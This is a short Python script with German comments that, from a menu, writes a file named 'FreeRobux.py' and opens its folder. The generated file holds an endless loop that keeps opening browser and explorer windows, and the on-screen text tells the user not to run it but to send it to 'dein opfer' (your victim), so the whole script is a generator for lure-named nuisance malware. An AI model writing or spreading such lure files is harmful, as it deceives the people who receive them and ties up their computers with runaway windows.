
ToolM = """  __________  ____  __    __  ___
 /_  __/ __ \/ __ \/ /   /  |/  /
  / / / / / / / / / /   / /|_/ / 
 / / / /_/ / /_/ / /___/ /  / /  
/_/  \____/\____/_____/_/  /_/   """
print(ToolM)

menu1 = True
while True:
    menu = input("[1] Start")
    if menu == "1":
        start = """         _____           _      ____  _______     _____ ____ _____ 
        |  ___|_/\__    / \    |  _ \| ____\ \   / /_ _/ ___| ____|
        | |_  \    /   / _ \   | | | |  _|  \ \ / / | | |   |  _|  
        |  _| /_  _\  / ___ \  | |_| | |___  \ V /  | | |___| |___ 
        |_|     \/   /_/   \_\ |____/|_____|  \_/  |___\____|_____|"""
        print(start)
        menu2 = True
        while True:
            print("wenn du 1 drückst und spammer klickst dann wird sich ein order mit einer free Robux datei öffnen öffne nicht sondern schick es zu dein opfer")
            menu3 = input("[1] spammer")
            if menu3 == "1":
                import os
                import platform
                # Code, den du in die .py-Datei schreiben möchtest
                python_code = """
import webbrowser
url = "free vbucks"
while True:
    webbrowser.open(url)
    webbrowser.open("explorer")
    webbrowser.open(url)
    webbrowser.open("explorer")
                """

                # Name der .py-Datei
                file_name = "FreeRobux.py"

                # Dateipfad des aktuellen Skripts
                script_directory = os.path.dirname(os.path.realpath(__file__))

                # .py-Datei erstellen und den Code schreiben
                file_path = os.path.join(script_directory, file_name)
                with open(file_path, "w") as file:
                    file.write(python_code)

                # Ordner öffnen
                try:
                    if platform.system() == "Windows":
                        os.startfile(script_directory)  # Für Windows
                    elif platform.system() == "Darwin":
                        os.system(f"open {script_directory}")  # Für macOS
                    elif platform.system() == "Linux":
                        os.system(f"xdg-open {script_directory}")  # Für Linux
                except Exception as e:
                    print(f"Fehler beim Öffnen des Ordners: {e}")
            break
        break